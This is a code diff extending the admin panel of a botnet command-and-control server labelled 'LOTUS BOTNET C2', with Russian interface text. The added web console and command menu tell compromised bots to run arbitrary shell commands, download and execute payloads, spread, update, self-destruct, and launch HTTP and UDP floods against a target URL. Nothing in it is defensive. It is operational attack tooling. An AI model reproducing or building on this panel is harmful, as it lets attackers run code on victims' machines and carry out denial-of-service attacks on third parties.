@@ -221,8 +221,27 @@ def admin():
         .logs .log .time { color: #555; }
         .logs .log .bot { color: #2A7FFF; }
         .ddos-panel { background: #0A0A0F; padding: 15px; border-radius: 8px; border: 1px solid #1A1A2E; margin-top: 15px; }
+        .console { background: #0A0A0F; padding: 15px; border-radius: 8px; border: 1px solid #1A1A2E; font-family: monospace; }
+        .console-input { display: flex; gap: 10px; margin-top: 10px; }
+        .console-input input { flex: 1; background: #14141E; border: 1px solid #1A1A2E; color: #0f0; padding: 10px 15px; border-radius: 8px; font-family: monospace; font-size: 14px; }
+        .console-input input:focus { outline: none; border-color: #2A7FFF; }
+        .console-output { max-height: 300px; overflow-y: auto; color: #0f0; font-size: 13px; line-height: 1.6; }
+        .console-output .prompt { color: #2A7FFF; }
+        .console-output .error { color: #e74c3c; }
+        .console-output .info { color: #f1c40f; }
+        .console-output .success { color: #2ecc71; }
+        .help-grid { display: grid; grid-template-columns: auto 1fr auto; gap: 5px 20px; font-size: 12px; color: #888; margin: 10px 0; }
+        .help-grid .cmd { color: #2A7FFF; font-weight: 600; }
+        .help-grid .desc { color: #A0A0B0; }
+        .help-grid .example { color: #555; font-size: 11px; }
         @media (max-width: 768px) { .stats { flex-direction: column; } .cmd-form { flex-direction: column; } }
         .id-cell { font-family: monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }
+        .console-output .cmd-result { color: #fff; }
+        .console-output .cmd-result .status-code { font-weight: bold; }
+        .console-output .cmd-result .status-2xx { color: #2ecc71; }
+        .console-output .cmd-result .status-3xx { color: #f1c40f; }
+        .console-output .cmd-result .status-4xx { color: #e67e22; }
+        .console-output .cmd-result .status-5xx { color: #e74c3c; }
     </style>
 </head>
 <body>
@@ -238,7 +257,9 @@ def admin():
         <button class="tab" onclick="showPanel('commands')">📡 Команды</button>
         <button class="tab" onclick="showPanel('logs')">📋 Логи</button>
         <button class="tab" onclick="showPanel('ddos')">💥 DDoS</button>
+        <button class="tab" onclick="showPanel('console')">⌨️ КОНСОЛЬ</button>
     </div>
+    
     <div class="panel active" id="panel-bots">
         <div style="margin-bottom: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
             <button class="btn" onclick="refreshBots()">🔄 Обновить</button>
@@ -251,18 +272,21 @@ def admin():
             </table>
         </div>
     </div>
+    
     <div class="panel" id="panel-commands">
         <h3 style="color:#fff; margin-bottom:15px;">📡 Отправить команду</h3>
         <form class="cmd-form" onsubmit="sendCommand(event)">
             <select name="bot_id" id="cmdBotSelect"><option value="all">🌐 ВСЕМ БОТАМ</option></select>
             <select name="command" id="cmdType">
-                <option value="ddos">💥 DDoS</option>
+                <option value="http_flood">💥 HTTP Flood</option>
+                <option value="udp_flood">💥 UDP Flood</option>
                 <option value="cmd">💻 CMD</option>
                 <option value="download">📥 Скачать и запустить</option>
                 <option value="update">🔄 Обновиться</option>
                 <option value="selfdestruct">💀 Самоуничтожение</option>
                 <option value="spread">📀 Распространиться</option>
                 <option value="info">📊 Информация</option>
+                <option value="ping">🏓 Ping</option>
             </select>
             <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
             <button type="submit">▶ Отправить</button>
@@ -270,6 +294,7 @@ def admin():
         <h3 style="color:#fff; margin:20px 0 10px;">📋 История команд</h3>
         <div style="overflow-x:auto;"><table><thead><tr><th>Бот</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead><tbody id="commandsBody"></tbody></table></div>
     </div>
+    
     <div class="panel" id="panel-logs">
         <div style="margin-bottom: 10px; display: flex; gap: 10px;">
             <button class="btn" onclick="refreshLogs()">🔄 Обновить</button>
@@ -277,6 +302,7 @@ def admin():
         </div>
         <div class="logs" id="logsContainer"></div>
     </div>
+    
     <div class="panel" id="panel-ddos">
         <h3 style="color:#fff; margin-bottom:15px;">💥 МАССОВАЯ DDoS АТАКА</h3>
         <form class="cmd-form" onsubmit="startDDoS(event)">
@@ -288,6 +314,47 @@ def admin():
             <p style="color:#666; font-size:12px;">📊 Ботов в атаке: <span id="ddosCount">0</span></p>
         </div>
     </div>
+    
+    <div class="panel" id="panel-console">
+        <h3 style="color:#fff; margin-bottom:15px;">⌨️ КОМАНДНАЯ КОНСОЛЬ</h3>
+        <div class="console">
+            <div class="console-output" id="consoleOutput">
+                <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
+                <div class="info">Введите help для списка команд</div>
+                <div class="info">Команды выполняются на всех онлайн ботах</div>
+                <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
+            </div>
+            <div class="console-input">
+                <input type="text" id="consoleInput" placeholder="Введите команду..." autofocus>
+                <button class="btn" onclick="executeConsoleCommand()" style="background:#2A7FFF; color:#fff;">⏎</button>
+                <button class="btn" onclick="clearConsole()">🗑️ Очистить</button>
+            </div>
+        </div>
+        <div style="margin-top:15px;">
+            <details style="color:#666; font-size:12px;">
+                <summary style="cursor:pointer; color:#2A7FFF;">📖 Список команд (help)</summary>
+                <div class="help-grid">
+                    <span class="cmd">help</span><span class="desc">Показать это меню</span><span class="example"></span>
+                    <span class="cmd">list</span><span class="desc">Список всех ботов</span><span class="example"></span>
+                    <span class="cmd">cmd &lt;команда&gt;</span><span class="desc">Выполнить CMD на всех ботах</span><span class="example">cmd whoami</span>
+                    <span class="cmd">cmd &lt;бот_id&gt; &lt;команда&gt;</span><span class="desc">Выполнить CMD на конкретном боте</span><span class="example">cmd BOT_123 whoami</span>
+                    <span class="cmd">ddos &lt;url&gt;</span><span class="desc">Запустить HTTP Flood на всех ботах</span><span class="example">ddos https://target.com</span>
+                    <span class="cmd">udp &lt;url&gt;</span><span class="desc">Запустить UDP Flood на всех ботах</span><span class="example">udp https://target.com</span>
+                    <span class="cmd">info &lt;бот_id&gt;</span><span class="desc">Получить информацию о боте</span><span class="example">info BOT_123</span>
+                    <span class="cmd">info</span><span class="desc">Получить информацию о всех ботах</span><span class="example"></span>
+                    <span class="cmd">kill &lt;бот_id&gt;</span><span class="desc">Самоуничтожение бота</span><span class="example">kill BOT_123</span>
+                    <span class="cmd">spread</span><span class="desc">Запустить распространение на всех ботах</span><span class="example"></span>
+                    <span class="cmd">download &lt;url&gt;</span><span class="desc">Скачать и запустить файл на всех ботах</span><span class="example">download https://example.com/payload.exe</span>
+                    <span class="cmd">update &lt;url&gt;</span><span class="desc">Обновить ботов</span><span class="example">update https://example.com/new_bot.exe</span>
+                    <span class="cmd">ping</span><span class="desc">Проверить соединение с ботами</span><span class="example"></span>
+                    <span class="cmd">logs</span><span class="desc">Показать последние логи</span><span class="example"></span>
+                    <span class="cmd">clear</span><span class="desc">Очистить логи</span><span class="example"></span>
+                    <span class="cmd">stats</span><span class="desc">Показать статистику</span><span class="example"></span>
+                </div>
+            </details>
+        </div>
+    </div>
+    
     <script>
         function showPanel(name) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
@@ -296,7 +363,9 @@ def admin():
             document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
             if (name === 'bots') refreshBots();
             if (name === 'logs') refreshLogs();
+            if (name === 'console') document.getElementById('consoleInput').focus();
         }
+        
         async function refreshStats() {
             try {
                 const r = await fetch('/api/stats');
@@ -308,6 +377,7 @@ def admin():
                 document.getElementById('ddosCount').textContent = data.online || 0;
             } catch {}
         }
+        
         async function refreshBots() {
             try {
                 const r = await fetch('/api/bots');
@@ -331,6 +401,7 @@ def admin():
                 refreshStats();
             } catch {}
         }
+        
         async function refreshLogs() {
             try {
                 const r = await fetch('/api/logs?limit=100');
@@ -346,6 +417,7 @@ def admin():
                 });
             } catch {}
         }
+        
         async function sendCommand(e) {
             e.preventDefault();
             const botId = document.getElementById('cmdBotSelect').value;
@@ -358,7 +430,9 @@ def admin():
             await fetch('/api/send_command', { method: 'POST', body: formData });
             document.getElementById('cmdParams').value = '';
             refreshStats();
+            addConsoleLine('success', '✅ Команда отправлена: ' + command + ' ' + params + ' -> ' + botId);
         }
+        
         async function sendQuickCommand(botId, command, params) {
             const formData = new FormData();
             formData.append('bot_id', botId);
@@ -366,27 +440,33 @@ def admin():
             formData.append('params', params);
             await fetch('/api/send_command', { method: 'POST', body: formData });
             refreshStats();
+            addConsoleLine('success', '✅ Команда отправлена: ' + command + ' -> ' + botId);
         }
+        
         async function startDDoS(e) {
             e.preventDefault();
             const target = document.getElementById('ddosTarget').value;
             if (!target) return;
             const formData = new FormData();
             formData.append('bot_id', 'all');
-            formData.append('command', 'ddos');
+            formData.append('command', 'http_flood');
             formData.append('params', target);
             await fetch('/api/send_command', { method: 'POST', body: formData });
             document.getElementById('ddosTarget').value = '';
             refreshStats();
+            addConsoleLine('success', '🔥 DDoS атака запущена на ' + target);
             alert('🔥 DDoS атака запущена на ' + target);
         }
+        
         async function deleteBot(id) {
             if (!confirm('Удалить бота ' + id + '?')) return;
             const formData = new FormData();
             formData.append('id', id);
             await fetch('/api/delete_bot', { method: 'POST', body: formData });
             refreshBots();
+            addConsoleLine('error', '🗑️ Бот удален: ' + id);
         }
+        
         async function deleteAllBots() {
             if (!confirm('Удалить ВСЕХ ботов?')) return;
             const data = await (await fetch('/api/bots')).json();
@@ -396,12 +476,233 @@ def admin():
                 await fetch('/api/delete_bot', { method: 'POST', body: fd });
             }
             refreshBots();
+            addConsoleLine('error', '🗑️ Все боты удалены');
         }
+        
         async function clearLogs() {
             if (!confirm('Очистить логи?')) return;
             await fetch('/api/clear_logs', { method: 'POST' });
             refreshLogs();
+            addConsoleLine('info', '🗑️ Логи очищены');
         }
+        
+        // ============== КОНСОЛЬ ==============
+        function addConsoleLine(type, text) {
+            const output = document.getElementById('consoleOutput');
+            const div = document.createElement('div');
+            const time = new Date().toLocaleTimeString();
+            div.innerHTML = `<span style="color:#555;">[${time}]</span> <span class="${type}">${text}</span>`;
+            output.appendChild(div);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function clearConsole() {
+            document.getElementById('consoleOutput').innerHTML = `
+                <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
+                <div class="info">Введите help для списка команд</div>
+                <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
+            `;
+        }
+        
+        function parseCommand(cmd) {
+            const parts = cmd.trim().split(/\s+/);
+            const command = parts[0].toLowerCase();
+            const args = parts.slice(1);
+            return { command, args };
+        }
+        
+        async function executeConsoleCommand() {
+            const input = document.getElementById('consoleInput');
+            const cmd = input.value.trim();
+            if (!cmd) return;
+            
+            input.value = '';
+            addConsoleLine('prompt', '> ' + cmd);
+            
+            const { command, args } = parseCommand(cmd);
+            
+            try {
+                switch(command) {
+                    case 'help':
+                        addConsoleLine('info', 'Доступные команды:');
+                        addConsoleLine('info', '  help - показать это меню');
+                        addConsoleLine('info', '  list - список ботов');
+                        addConsoleLine('info', '  cmd <команда> - выполнить CMD на всех ботах (пример: cmd whoami)');
+                        addConsoleLine('info', '  cmd <бот_id> <команда> - выполнить CMD на конкретном боте');
+                        addConsoleLine('info', '  ddos <url> - HTTP Flood (пример: ddos https://target.com)');
+                        addConsoleLine('info', '  udp <url> - UDP Flood');
+                        addConsoleLine('info', '  info <бот_id> - информация о боте');
+                        addConsoleLine('info', '  kill <бот_id> - самоуничтожение бота');
+                        addConsoleLine('info', '  spread - распространение на всех ботах');
+                        addConsoleLine('info', '  download <url> - скачать и запустить');
+                        addConsoleLine('info', '  update <url> - обновить ботов');
+                        addConsoleLine('info', '  ping - проверить соединение');
+                        addConsoleLine('info', '  stats - статистика ботов');
+                        addConsoleLine('info', '  logs - показать логи');
+                        addConsoleLine('info', '  clear - очистить логи');
+                        break;
+                        
+                    case 'list':
+                        const botsRes = await fetch('/api/bots');
+                        const bots = await botsRes.json();
+                        if (bots.length === 0) {
+                            addConsoleLine('info', 'Нет подключенных ботов');
+                        } else {
+                            addConsoleLine('info', '🤖 Ботов: ' + bots.length);
+                            bots.forEach(b => {
+                                const status = b.status === 'online' ? '🟢' : '🔴';
+                                addConsoleLine('info', `  ${status} ${b.id} (${b.ip || 'N/A'}) - ${b.status}`);
+                            });
+                        }
+                        break;
+                        
+                    case 'stats':
+                        await refreshStats();
+                        addConsoleLine('info', '📊 Статистика обновлена');
+                        break;
+                        
+                    case 'logs':
+                        await refreshLogs();
+                        addConsoleLine('info', '📋 Логи обновлены');
+                        break;
+                        
+                    case 'clear':
+                        await clearLogs();
+                        break;
+                        
+                    case 'ping':
+                        const pingForm = new FormData();
+                        pingForm.append('bot_id', 'all');
+                        pingForm.append('command', 'ping');
+                        pingForm.append('params', '');
+                        await fetch('/api/send_command', { method: 'POST', body: pingForm });
+                        addConsoleLine('success', '🏓 Ping отправлен всем ботам');
+                        break;
+                        
+                    case 'cmd':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: cmd <команда> или cmd <бот_id> <команда>');
+                            break;
+                        }
+                        let target = 'all';
+                        let cmdToExec = args.join(' ');
+                        // Проверяем, первый аргумент похож на ID бота (не команда)
+                        if (args.length > 1 && args[0].startsWith('BOT_')) {
+                            target = args[0];
+                            cmdToExec = args.slice(1).join(' ');
+                        }
+                        const cmdForm = new FormData();
+                        cmdForm.append('bot_id', target);
+                        cmdForm.append('command', 'cmd');
+                        cmdForm.append('params', cmdToExec);
+                        await fetch('/api/send_command', { method: 'POST', body: cmdForm });
+                        addConsoleLine('success', `💻 CMD отправлен ${target}: ${cmdToExec}`);
+                        break;
+                        
+                    case 'ddos':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: ddos <url>');
+                            break;
+                        }
+                        const ddosForm = new FormData();
+                        ddosForm.append('bot_id', 'all');
+                        ddosForm.append('command', 'http_flood');
+                        ddosForm.append('params', args[0]);
+                        await fetch('/api/send_command', { method: 'POST', body: ddosForm });
+                        addConsoleLine('success', `🔥 DDoS запущен на ${args[0]}`);
+                        break;
+                        
+                    case 'udp':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: udp <url>');
+                            break;
+                        }
+                        const udpForm = new FormData();
+                        udpForm.append('bot_id', 'all');
+                        udpForm.append('command', 'udp_flood');
+                        udpForm.append('params', args[0]);
+                        await fetch('/api/send_command', { method: 'POST', body: udpForm });
+                        addConsoleLine('success', `🔥 UDP Flood запущен на ${args[0]}`);
+                        break;
+                        
+                    case 'info':
+                        let infoTarget = 'all';
+                        if (args.length > 0) infoTarget = args[0];
+                        const infoForm = new FormData();
+                        infoForm.append('bot_id', infoTarget);
+                        infoForm.append('command', 'info');
+                        infoForm.append('params', '');
+                        await fetch('/api/send_command', { method: 'POST', body: infoForm });
+                        addConsoleLine('success', `📊 Запрос информации отправлен ${infoTarget}`);
+                        break;
+                        
+                    case 'kill':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: kill <бот_id>');
+                            break;
+                        }
+                        const killForm = new FormData();
+                        killForm.append('bot_id', args[0]);
+                        killForm.append('command', 'selfdestruct');
+                        killForm.append('params', '');
+                        await fetch('/api/send_command', { method: 'POST', body: killForm });
+                        addConsoleLine('success', `💀 Самоуничтожение отправлено ${args[0]}`);
+                        break;
+                        
+                    case 'spread':
+                        const spreadForm = new FormData();
+                        spreadForm.append('bot_id', 'all');
+                        spreadForm.append('command', 'spread');
+                        spreadForm.append('params', '');
+                        await fetch('/api/send_command', { method: 'POST', body: spreadForm });
+                        addConsoleLine('success', '📀 Распространение запущено на всех ботах');
+                        break;
+                        
+                    case 'download':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: download <url>');
+                            break;
+                        }
+                        const downForm = new FormData();
+                        downForm.append('bot_id', 'all');
+                        downForm.append('command', 'download');
+                        downForm.append('params', args[0]);
+                        await fetch('/api/send_command', { method: 'POST', body: downForm });
+                        addConsoleLine('success', `📥 Скачивание отправлено: ${args[0]}`);
+                        break;
+                        
+                    case 'update':
+                        if (args.length === 0) {
+                            addConsoleLine('error', '❌ Использование: update <url>');
+                            break;
+                        }
+                        const updForm = new FormData();
+                        updForm.append('bot_id', 'all');
+                        updForm.append('command', 'update');
+                        updForm.append('params', args[0]);
+                        await fetch('/api/send_command', { method: 'POST', body: updForm });
+                        addConsoleLine('success', `🔄 Обновление отправлено: ${args[0]}`);
+                        break;
+                        
+                    default:
+                        addConsoleLine('error', `❌ Неизвестная команда: ${command}. Введите help`);
+                }
+            } catch(e) {
+                addConsoleLine('error', '❌ Ошибка: ' + e.message);
+            }
+            
+            refreshStats();
+        }
+        
+        // Enter для консоли
+        document.getElementById('consoleInput').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                executeConsoleCommand();
+            }
+        });
+        
+        // ============== ИНИЦИАЛИЗАЦИЯ ==============
         setInterval(refreshStats, 10000);
         setInterval(refreshBots, 30000);
         refreshStats();
